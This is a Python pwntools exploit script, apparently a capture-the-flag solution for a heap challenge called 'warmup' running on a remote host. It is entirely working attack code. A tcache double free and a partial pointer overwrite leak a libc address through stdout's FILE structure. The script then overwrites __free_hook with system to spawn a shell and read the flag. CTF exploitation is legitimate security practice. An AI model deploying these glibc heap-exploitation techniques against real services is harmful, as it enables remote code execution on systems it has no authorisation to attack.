#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
context.log_level = 'error'
execve_file = './warmup'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('47.52.90.3', 9999)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    def pr
        x/10gx $rebase(0x0202080)
        end
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def add(content):
    sh.sendlineafter('>>', '1')
    sh.sendafter('content>>', content)

def delete(index):
    sh.sendlineafter('>>', '2')
    sh.sendlineafter('index:', str(index))

def modify(index, content):
    sh.sendlineafter('>>', '3')
    sh.sendlineafter('index:', str(index))
    sh.sendafter('content>>', content)

add('\n')
delete(0)
delete(0)

two_byte = 0x0010 + (random.randint(0, 0xf) << 12)
# add(p16(0x7010))
add(p16(two_byte))
add('\n')
add(p8(0xff) * 0x40)
delete(2)
add(p8(1) * 0x40)
delete(0)

# modify(1, p16(0x0760) + '\xdd')
two_byte = 0x0760 + (random.randint(0, 0xf) << 12)
modify(1, p16(two_byte))

add('\n')
add(p64(0xfbad2887 | 0x1000) + p64(0) * 3 + p8(0xc8))
result = sh.recvn(8)
libc_addr = u64(result) - libc.symbols['_IO_2_1_stdin_']
log.success('libc_addr: ' + hex(libc_addr))

delete(0)
delete(1)
add(p64(libc_addr + libc.symbols['__free_hook']))
add('/bin/sh\0')
add(p64(libc_addr + libc.symbols['system']))

delete(0)
sh.sendline('cat flag')

sh.interactive()
clear()